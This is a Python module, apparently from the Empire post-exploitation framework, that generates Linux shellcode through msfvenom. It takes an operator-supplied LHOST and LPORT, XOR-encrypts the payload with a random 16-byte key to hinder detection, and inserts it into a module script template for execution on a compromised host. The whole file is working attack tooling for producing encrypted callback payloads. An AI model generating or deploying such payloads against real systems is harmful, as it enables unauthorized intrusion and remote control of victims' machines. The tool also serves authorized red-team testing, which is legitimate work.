from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.exceptions import ModuleExecutionException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize
import os
import subprocess


class Module:

  @staticmethod
  def format_bytes(byte_buffer: bytes) -> str:
    return ''.join(['\\x%02x' % b for b in byte_buffer])

  @staticmethod
  def validate_params(params: dict):
    if 'linux' not in params['MsfPayload']:
      raise ModuleValidationException('This module needs a Linux shellcode.')
    try:
      int(params['LPORT'])
    except ValueError:
      raise ModuleValidationException('LPORT must be an integer.')
 
  @staticmethod
  @auto_finalize
  def generate(main_menu: MainMenu,
               module: EmpireModule,
               params: dict,
               obfuscate: bool = False,
               obfuscation_command: str = ""): 
    Module.validate_params(params)
    xor_key = Module.format_bytes(os.urandom(16))
    try:
      payload = Module.format_bytes(subprocess.check_output([
        'msfvenom',
        '--payload', params['MsfPayload'],
        'LHOST=%s' % params['LHOST'],
        'LPORT=%d' % int(params['LPORT']),
        '--encrypt', 'xor',
        '--encrypt-key', xor_key,
      ]))
    except subprocess.CalledProcessError:
      raise ModuleExecutionException(
          'An error occurred generating the payload with msfvenom.')
    script = module.script % (payload, xor_key)
    return script, ''